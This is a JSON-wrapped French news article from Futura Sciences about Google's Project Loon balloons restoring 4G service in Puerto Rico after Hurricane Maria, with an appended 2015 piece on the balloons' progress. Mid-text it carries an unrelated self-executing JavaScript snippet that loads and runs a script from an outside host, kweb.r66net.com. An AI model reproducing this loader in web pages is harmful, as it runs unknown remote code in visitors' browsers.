{"title": "Projet Loon : les ballons de Google au secours de Porto Rico", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "09/10/2017", "content": "Google vient d'obtenir l'autorisation de déployer une flotte de ballons stratosphériques qui vont aider à rétablir un réseau de téléphonie 4G sur l'île de Porto Rico dévastée par l'ouragan Maria. Le 20 septembre, l' ouragan  Maria traversait l'île de Porto Rico, laissant derrière lui un territoire dévasté par des  vents  de plus de 200 km/h et des pluies diluviennes (36 cm en une heure, record mondial). Trois millions et demi d'habitants se sont retrouvés privés d'électricité, d'eau portable et de moyens de communication. Depuis, les efforts pour restaurer les infrastructures essentielles avancent avec peine. Selon les chiffres communiqués par le gouvernement de  Porto Rico , près de 20 jours après la catastrophe, plus de 88 % des foyers sont toujours privés d'électricité et près de la moitié n'ont pas d'eau potable. Le réseau de communication a également beaucoup souffert, plus de 81 % des antennes relais sont hors service. L'île de Porto Rico, avant (à droite, le 24 juillet 2017) et après (à gauche, le 25 septembre 2017) le passage de l'ouragan Maria le 20 septembre 2017. © NOAA                               Tesla et Alphabet au secours de Porto Rico C'est dans ce contexte dramatique que quelques grands noms de l'industrie high-tech ont choisi de s'impliquer. Elon Musk, le dirigeant de Tesla, a proposé  via   Twitter  de reconstruire le réseau électrique de l'île en s'appuyant sur sa solution combinant des batteries et des panneaux photovoltaïques. De son côté Alphabet, la maison-mère de  Google , a obtenu l'autorisation de participer à la restauration du réseau de communication de Porto Rico. Le géant californien a reçu le feu vert de la  Federal Communications Commission  (FCC) pour déployer 30 de ses  ballons  stratosphériques du  Projet Loon  durant une période de six mois.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ils vont servir de relais pour créer un réseau de téléphonie  4G  d'urgence, le temps de remettre le réseau terrestre en état. Pour ce projet, Alphabet va travailler avec les opérateurs de téléphonies locaux afin de pouvoir utiliser leurs fréquences. Une initiative similaire a été menée en mars dernier au  Pérou  suite aux inondations qui ont frappé le pays. Les responsables du Projet Loon soulignaient alors que c'était la première fois qu'une connexion  Internet  diffusée  via  des ballons était distribuée à plusieurs dizaines de milliers de personnes. Pour en savoir plus Projet Loon : les ballons de Google peuvent désormais relayer la 4G Article initial de Marc Zaffagni, paru le 13/03/2015 Lancé en juin 2013, le projet Google Loon d'accès Internet  via  des ballons stratosphériques a beaucoup évolué depuis. Les ballons peuvent désormais voler durant six mois consécutifs et retransmettre une connexion cellulaire 4G à des terminaux compatibles. Des essais sont en cours en Nouvelle-Zélande et au Brésil. Il y a un peu moins de deux ans, Google lançait le  projet Loon  dont l'ambition est de fournir une connexion Internet aux deux tiers de la population mondiale qui n'en bénéficient pas à l'heure actuelle. Cette initiative, à laquelle s'est associé le  Cnes , a franchi plusieurs paliers techniques importants. Le site  Ars Technica , qui a pu échanger avec l'équipe du projet Loon, rend compte de ces progrès. Les ballons stratosphériques utilisés par  Google  sont désormais capables de relayer un signal cellulaire 4G et d'offrir une  vitesse  de téléchargement de 10 Mbit/s. L'autre avancée notable du projet Loon est que les ballons peuvent voler pendant plus d'une centaine de jours.  Google  a récemment annoncé avoir battu un nouveau record avec un vol de 187 jours. Lors de cet essai, le ballon a effectué neuf fois le tour de la  Terre , affrontant des températures extrêmes (- 75 °C), des vents de 291 km/h et en évoluant jusqu'à 21 km d'altitude.  Contrairement à ce que fait le géant américain avec son projet  Google Fibre  de connexion Internet très haut  débit  par fibre optique, les ballons du projet Loon ne vont pas fournir le service en lui-même mais relayer le signal des réseaux cellulaires existants. Chaque ballon est en effet équipé d'une liaison bidirectionnelle qui lui permet de recevoir le signal émis par les antennes relais puis de le répercuter vers des  smartphones , des  ordinateurs  ou d'autres appareils équipés d'un système de réception compatible 4G. Un ballon peut diffuser le signal dans un rayon de 80 km. Ce périmètre peut être étendu si plusieurs ballons se transmettent le signal avant de le renvoyer sur Terre. L'avantage crucial pour les opérateurs de téléphonie est qu'ils pourront ainsi étendre leur réseau sans avoir à investir dans les infrastructures, ce qui est un frein majeur pour desservir des zones jugées peu rentables économiquement. Pour le moment, Google teste son service de connexion Internet par ballons à petite échelle en Nouvelle-Zélande. Plus récemment, au Brésil, des élèves d’une école rurale ontpu accéder à la Toilepour la première fois grâce à la connexion 4G relayée par les ballons Loon. © Google Loon                               Autorisés à voler dans tous les pays de l'hémisphère sud Les ballons Google ont donc le potentiel d'amener l'Internet à au moins une partie des 5 milliards de personnes qui n'en disposent pas dans les nombreuses zones du Globe non desservies en raison d'obstacles  physiques  ou économiques. La  compatibilité   4G  est aussi un atout considérable puisqu'elle fonctionne avec les terminaux compatibles existants et peut assurer une qualité de connexion suffisante pour la navigation Internet. À l'origine, le projet Loon diffusait  via  un signal  3G  et nécessitait l'installation d'une antenne sur les habitations participant aux essais. Google a fait évoluer la puissance d' émission  du dispositif afin de pouvoir toucher directement les antennes des  téléphones mobiles . Cette orientation technique vise à répondre à une tendance de plus en plus marquée dans les pays en voie de développement où les habitants n'ayant pas les moyens de posséder plusieurs appareils s'équipent uniquement d'un  smartphone  pour communiquer et naviguer sur la Toile.  Initialement lancé en Nouvelle-Zélande, le projet Loon a récemment été introduit en Amérique latine au Brésil. Là-bas, Google a étrenné sa technologie 4G avec une école rurale qui ne disposait jusqu'alors d'aucun accès Internet. Le géant américain ne donne pas encore de date précise pour un lancement à grande échelle de son service, mais indique qu'il a désormais des autorisations de  survol  de tous les pays de l' hémisphère sud . L'ouragan Maria observé en infrarouge                       L'ouragan Maria vu par le satellite GOES-16, de la NOAA le 20 septembre 2017, quand il passait au-dessus de l'île de Porto Rico. L'image est prise en infrarouge. Les couleurs sont donc fausses mais informatives. Elles indiquent la densité des nuages et la force de la tempête. Autour de l'œil du cyclone, la couleur rouge montre les plus fortes puissances.                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  lancer de ballons  |  ballons helium  |  ballons air chaud  |  peuvent entrer en collision avec terre  |  tous problemes peuvent avoir solution technique", "theme": "tech"}